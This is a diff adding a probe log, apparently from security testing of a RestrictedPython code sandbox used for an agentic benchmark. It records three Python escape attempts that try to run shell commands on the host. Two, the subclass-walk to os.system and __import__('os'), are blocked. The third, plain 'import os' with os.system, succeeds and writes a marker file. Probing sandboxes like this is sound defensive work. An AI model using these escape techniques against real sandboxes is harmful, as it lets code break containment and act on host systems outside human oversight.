@@ -1,0 +1,26 @@
+--- P12a
+code:
+subs = ().__class__.__base__.__subclasses__()
+names = [c.__name__ for c in subs]
+print('wrap_close' if '_wrap_close' in names else 'no-wrap_close', 'Popen' if 'Popen' in names else 'no-Popen')
+w = [c for c in subs if c.__name__ == '_wrap_close'][0]
+w.__init__.__globals__['system']('echo PWNED-a; echo PWNED-a > ~/p/agentic-search-bench/research/probes/restrictedpython-codemode/out/P12-escape-marker.txt')
+{"ok": false, "result": null, "error": "Execution error: ('Line 1: \"__subclasses__\" is an invalid attribute name because it starts with \"_\".', 'Line 1: \"__base__\" is an invalid attribute name because it starts with \"_\".', 'Line 1: \"__class__\" is an invalid attribute name because it starts with \"_\".', 'Line 2: \"__name__\" is an invalid attribute name because it starts with \"_\".', 'Line 4: \"__name__\" is an invalid attribute name because it starts with \"_\".', 'Line 5: \"__globals__\" is an invalid attribute name because it starts with \"_\".', 'Line 5: \"__init__\" is an invalid attribute name because it starts with \"_\".')", "ms": 1.3}
+stdout (0 chars): ''
+host marker written: False
+--- P12b
+code:
+__import__("os").system("echo PWNED-b; echo PWNED-b >> ~/p/agentic-search-bench/research/probes/restrictedpython-codemode/out/P12-escape-marker.txt")
+{"ok": false, "result": null, "error": "Execution error: ('Line 1: \"__import__\" is an invalid variable name because it starts with \"_\"',)", "ms": 0.1}
+stdout (0 chars): ''
+host marker written: False
+--- P12c
+code:
+import os
+result = os.system("echo PWNED-c; echo PWNED-c >> ~/p/agentic-search-bench/research/probes/restrictedpython-codemode/out/P12-escape-marker.txt")
+{"ok": true, "result": 0, "error": null, "ms": 10.7}
+stdout (0 chars): ''
+host marker written: True
+
+marker file contents: PWNED-c
+
